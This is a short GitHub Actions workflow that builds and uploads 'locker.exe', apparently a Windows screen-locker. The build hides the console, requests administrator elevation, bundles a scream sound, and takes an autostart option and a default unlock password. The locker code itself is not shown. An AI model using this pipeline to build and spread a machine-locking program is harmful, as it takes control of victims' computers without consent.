name: Build Locker
on:
  workflow_dispatch:
    inputs:
      password:
        description: 'Password'
        default: '8841'
      autostart:
        description: 'Autostart'
        default: 'true'

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Install
        run: pip install pillow keyboard psutil cryptography pygame pyinstaller
      - name: Generate
        env:
          INPUT_PASSWORD: ${{ inputs.password }}
          INPUT_AUTOSTART: ${{ inputs.autostart }}
        run: python locker_builder.py
      - name: Build
        run: pyinstaller --noconsole --onefile --uac-admin --add-data "assets;assets" --add-data "scream.mp3;." --name locker locker.py
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: locker-exe
          path: dist/locker.exe
